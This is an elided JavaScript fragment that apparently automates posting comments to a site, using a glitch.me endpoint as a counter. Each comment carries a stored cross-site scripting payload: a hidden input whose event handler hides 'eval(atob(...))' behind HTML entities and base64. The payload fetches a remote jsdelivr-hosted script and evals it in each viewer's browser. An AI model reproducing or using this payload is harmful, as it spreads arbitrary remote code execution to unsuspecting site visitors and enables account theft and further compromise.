...
async function fetchAndPost(quantity) {
    try {
        for (let i = 0; i < quantity; i++) {
            const commentString = `<input type=hidden oncontentvisibilityautostatechange="ev&#97;l(&#97;tob('ZmV0Y2goJ2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9naG91bHlhcy8xMUBtYWluLzAuanMnKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGV2YWwp'))" style	=content-visibility:auto>`;
            
            // Step 1: Fetch the counter URL asynchronously
            const counterResponse = await fetch('https://1a1a1.glitch.me/');
            ...
            if (postRequest.status < 400 || postRequest.status >= 500) {
                ...
                const additionalPostRequest = await fetch('https://1a1a1.glitch.me/', {
                    method: 'POST',
                    headers: {
...
async function executeTask() {
  ...
  const controlTimestamp = 1730948874167;
